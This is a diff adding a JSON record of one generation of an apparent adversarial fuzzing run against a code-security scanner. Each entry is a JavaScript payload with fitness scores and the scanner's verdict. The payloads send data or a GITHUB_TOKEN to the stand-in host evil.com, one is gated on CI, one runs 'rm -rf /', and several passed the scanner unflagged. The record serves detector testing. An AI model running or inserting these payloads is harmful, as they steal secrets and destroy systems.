@@ -1,0 +1,66 @@
+{
+  "generation": 5,
+  "population": [
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); ",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null);",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "if (process.env.CI === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); }",
+      "fitness": 38.1,
+      "isNovel": true,
+      "impact": 63,
+      "verdict": "REVIEW_INTENT_DRIFT",
+      "confidence": 0.99,
+      "graph": [
+        "[HEURISTIC] → SECRET → LIKELY_EXFILTRATION (Reasons: network resolution/transport patterns detected (wt: 0.85))"
+      ]
+    },
+    {
+      "payload": "setTimeout(() => { const x = process.env.GITHUB_TOKEN; fetch('http://evil.com?k=' + x); }, Math.random() * 5000);",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "BLOCK",
+      "confidence": 0.99,
+      "graph": [
+        "SECRET → NETWORK",
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "require('child_process').exec('rm -rf /'); ",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → EXECUTION"
+      ]
+    }
+  ]
+}
